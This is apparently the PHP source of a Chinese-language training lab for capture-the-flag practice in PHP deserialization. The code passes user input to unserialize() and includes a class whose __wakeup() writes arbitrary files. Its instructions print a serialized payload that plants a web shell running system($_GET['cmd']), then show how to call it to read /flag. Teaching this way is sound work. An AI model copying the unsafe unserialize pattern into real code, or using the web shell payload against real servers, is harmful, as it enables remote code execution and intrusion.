<?php
// User class with magic methods
class User {
    public $username;
    public $role;
    public $log_file;

    public function __construct($username = '', $role = 'user') {
        $this->username = $username;
        $this->role = $role;
        $this->log_file = '/tmp/user.log';
    }

    public function __toString() {
        return "User: {$this->username} ({$this->role})";
    }

    // VULNERABLE: Magic method that can be exploited
    public function __destruct() {
        if ($this->role === 'admin') {
            // Log admin actions
            file_put_contents($this->log_file, "Admin action by {$this->username}\n", FILE_APPEND);
        }
    }
}

// File handler class
class FileHandler {
    public $filename;
    public $content;

    public function __construct($filename = '', $content = '') {
        $this->filename = $filename;
        $this->content = $content;
    }

    // VULNERABLE: Magic method for file operations
    public function __wakeup() {
        // This executes when unserializing
        file_put_contents($this->filename, $this->content);
    }
}

$data = $_POST['data'] ?? '';
$result = '';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Other Hard - PHP 反序列化</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #f5f5f5; font-family: -apple-system, sans-serif; padding: 2rem; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #f59e0b; margin-bottom: 0.5rem; }
        .subtitle { color: #a1a1aa; margin-bottom: 2rem; font-size: 0.9rem; }
        .hint { background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 1rem; margin-bottom: 2rem; }
        .hint h3 { color: #f59e0b; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .hint p { color: #a1a1aa; font-size: 0.85rem; }
        .hint code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
        .form-section {
            background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px;
            padding: 2rem; margin-bottom: 2rem;
        }
        .form-section h3 { margin-bottom: 1rem; }
        textarea {
            width: 100%; padding: 0.75rem 1rem; background: #0a0a0a; border: 1px solid #27272a;
            color: #f5f5f5; border-radius: 8px; font-size: 0.9rem; min-height: 100px; resize: vertical; font-family: monospace;
        }
        textarea:focus { outline: none; border-color: #f59e0b; }
        button {
            padding: 0.75rem 1.5rem; background: #f59e0b; color: white; border: none;
            border-radius: 8px; cursor: pointer; font-size: 1rem; margin-top: 1rem;
        }
        button:hover { background: #d97706; }
        .result {
            background: #0a0a0a; border: 1px solid #27272a; border-radius: 8px;
            padding: 1.5rem; margin-bottom: 2rem; font-family: monospace; font-size: 0.9rem;
            white-space: pre-wrap; color: #f59e0b;
        }
        .code-display {
            background: #1e1e2e; border: 1px solid #27272a; border-radius: 8px;
            padding: 1.5rem; margin-bottom: 2rem; font-family: monospace; font-size: 0.85rem; overflow-x: auto;
        }
        .code-display .comment { color: #6b7280; }
        .code-display .keyword { color: #c084fc; }
        .code-display .string { color: #10b981; }
        .code-display .var { color: #3b82f6; }
        .info { background: #1a0a00; border: 1px solid #3f2000; border-radius: 8px; padding: 1rem; margin-top: 2rem; }
        .info h3 { color: #f59e0b; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .info p { color: #a1a1aa; font-size: 0.85rem; }
        .info code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>PHP 反序列化实验室</h1>
        <p class="subtitle">测试反序列化功能 | CyberRange Other Hard Lab</p>

        <div class="hint">
            <h3>学习目标</h3>
            <p>这是一个 PHP 反序列化漏洞靶场。<code>unserialize()</code> 函数在反序列化时会触发魔术方法。</p>
            <p>攻击者可以构造恶意的序列化数据，利用 <code>__wakeup()</code> 或 <code>__destruct()</code> 方法执行任意代码。</p>
            <p>这是一个高级漏洞，需要理解 PHP 面向对象编程和魔术方法。</p>
        </div>

        <div class="code-display">
            <span class="comment">// 可利用的类</span><br>
            <span class="keyword">class</span> <span class="var">FileHandler</span> {<br>
            &nbsp;&nbsp;<span class="keyword">public</span> <span class="var">$filename</span>;<br>
            &nbsp;&nbsp;<span class="keyword">public</span> <span class="var">$content</span>;<br>
            <br>
            &nbsp;&nbsp;<span class="keyword">public function</span> <span class="var">__wakeup</span>() {<br>
            &nbsp;&nbsp;&nbsp;&nbsp;file_put_contents(<span class="var">$this->filename</span>, <span class="var">$this->content</span>);<br>
            &nbsp;&nbsp;}<br>
            }
        </div>

        <div class="form-section">
            <h3>输入序列化数据</h3>
            <form method="POST">
                <textarea name="data" placeholder="输入序列化的 PHP 对象数据..."><?php echo htmlspecialchars($data); ?></textarea>
                <button type="submit">反序列化</button>
            </form>
        </div>

        <?php if ($data): ?>
        <div class="result">
            <?php
            // VULNERABLE: unserialize() with user input
            try {
                $obj = unserialize($data);
                if ($obj !== false) {
                    echo "反序列化成功！\n";
                    echo "对象类型: " . get_class($obj) . "\n";
                    echo "对象内容: " . print_r($obj, true);
                } else {
                    echo "反序列化失败！";
                }
            } catch (Throwable $e) {
                echo "错误: " . $e->getMessage();
            }
            ?>
        </div>
        <?php endif; ?>

        <div class="info">
            <h3>攻击方法</h3>
            <p><strong>步骤 1:</strong> 构造 FileHandler 对象的序列化数据：</p>
            <p><code>O:11:"FileHandler":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:30:"&lt;?php system($_GET['cmd']); ?&gt;";}</code></p>
            <p><strong>步骤 2:</strong> 提交序列化数据，<code>__wakeup()</code> 会创建 webshell</p>
            <p><strong>步骤 3:</strong> 访问 <code>shell.php?cmd=cat /flag</code></p>
            <p>flag 格式: <code>CR{...}</code> (在 /flag 文件中)</p>
        </div>
    </div>
</body>
</html>
